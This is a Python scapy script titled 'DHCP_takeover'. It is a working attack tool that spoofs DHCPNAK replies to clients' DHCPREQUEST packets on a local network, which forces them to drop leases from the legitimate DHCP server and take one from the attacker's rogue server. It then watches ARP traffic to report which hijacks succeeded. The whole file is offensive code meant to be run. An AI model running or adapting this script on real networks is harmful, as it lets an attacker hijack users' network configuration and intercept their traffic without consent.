#!/usr/bin/python

__author__ = "David Stainton"

# author David Stainton
# email dstainton415@gmail.com
# inspired by http://trac.secdev.org/scapy/wiki/DhcpTakeover

import sys
from optparse import OptionParser

import scapy
import scapy.all
from scapy.all import DHCP, ARP, BOOTP, Ether, UDP, IP


class DHCP_takeover:

    def __init__(self, mac='', ip='', nak_limit=3):

        self.our_dhcp_server_mac = mac
        self.our_dhcp_server_ip  = ip 
        self.nak_limit           = nak_limit
        self.macs                = {}
        self.attempted_dhcpnaks  = {}
        self.other_dhcp_servers  = {}

    # populate self.other_dhcp_servers; key as mac addr and value as ip addr
    # skip over entrees from our own dhcp server self.our_dhcp_server_mac
    def get_dhcp_servers(self):

        scapy.all.conf.checkIPaddr = False
        fam,hw = scapy.all.get_if_raw_hwaddr(scapy.all.conf.iface)

        dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff") / \
            IP(src="0.0.0.0",dst="255.255.255.255") / \
            scapy.all.UDP(sport=68,dport=67) / \
            scapy.all.BOOTP(chaddr=hw) / \
            scapy.all.DHCP(options=[("message-type","discover"),"end"])

        ans,unans = scapy.all.srp(dhcp_discover)
        dhcp_servers = []
        for snd,rcv in ans:
            if rcv[Ether].src != self.our_dhcp_server_mac:
                self.other_dhcp_servers[rcv[Ether].src] = rcv[IP].src
                print "Found other dhcp server at: %s %s" % (rcv[Ether].src, rcv[IP].src)


    # Spoofing a DHCPNAK from a legit DHCP server when a DHCPREQUEST is send from the DHCP client.
    def nak_request(self, packet):

        print "Spoofing DHCPNAK from %s / %s" % (self.other_dhcp_servers.keys()[0], self.other_dhcp_servers[self.other_dhcp_servers.keys()[0]])

        dhcp_server_mac = self.other_dhcp_servers.keys()[0]


        nak = Ether(src=self.our_dhcp_server_mac, dst=packet[Ether].dst) / \
            IP(src=self.our_dhcp_server_ip, dst=packet[IP].dst) / \
            UDP(sport=67,dport=68) / \
            BOOTP(op=2, ciaddr=packet[IP].src, siaddr=packet[IP].dst, chaddr=packet[Ether].src, xid=packet[BOOTP].xid) / \
            DHCP(options=[('server_id', self.our_dhcp_server_ip),('message-type','nak'), ('end')])

        scapy.all.sendp(nak)


    # Detecting DHCPREQUEST packets and ARP packets.
    def check_dhcp_and_arp(self, packet):

        if DHCP in packet and packet[DHCP].options[0][1] == 3:
            print "DHCPREQUEST detected from %s" %  packet[Ether].src
            self.macs[packet[Ether].src] = 0

            if self.attempted_dhcpnaks.has_key(packet[Ether].src) == False:
                self.attempted_dhcpnaks[packet[Ether].src] = 0

            if self.attempted_dhcpnaks[packet[Ether].src] < self.nak_limit:
                self.attempted_dhcpnaks[packet[Ether].src] += 1
                self.nak_request(packet)
            else:
                print "Giving up on spoofing DHCPNAK's for %s, failed" % packet[Ether].src
                del self.attempted_dhcpnaks[packet[Ether].src]

        if ARP in packet and packet[ARP].op == 0x0002:
            if self.macs.has_key(packet[Ether].src) == True:
                if packet[ARP].hwdst == self.our_dhcp_server_mac:
                    print "Succes: DHCP client %s obtained a lease for %s from our DHCP server" % (packet[ARP].hwsrc, packet[ARP].psrc)
                elif packet[ARP].hwdst in self.other_dhcp_servers:
                    print "Failure: DHCP client %s obtained a lease for %s from another DHCP server" % (packet[ARP].hwsrc, packet[ARP].psrc, )
                del self.macs[packet[Ether].src]


    def takeover(self):
        scapy.all.sniff(filter="arp or (udp and (port 67 or 68))", prn=self.check_dhcp_and_arp, store=0)


def main():

    usage = '%prog [options] <our-mac-addr> <our-ip-addr>'
    parser = OptionParser(usage=usage)
    parser.add_option('--nak-limit', dest='nak_limit', default=3,
        help="Limit the number of DHCP NAKs we send. Default is 3.")

    options, args = parser.parse_args()

    if len(args) < 2:
            parser.print_help()
            return 1

    d = DHCP_takeover(mac=args[0], ip=args[1], nak_limit=options.nak_limit)
    d.get_dhcp_servers()
    d.takeover()    



if __name__ == '__main__':
    sys.exit(main())


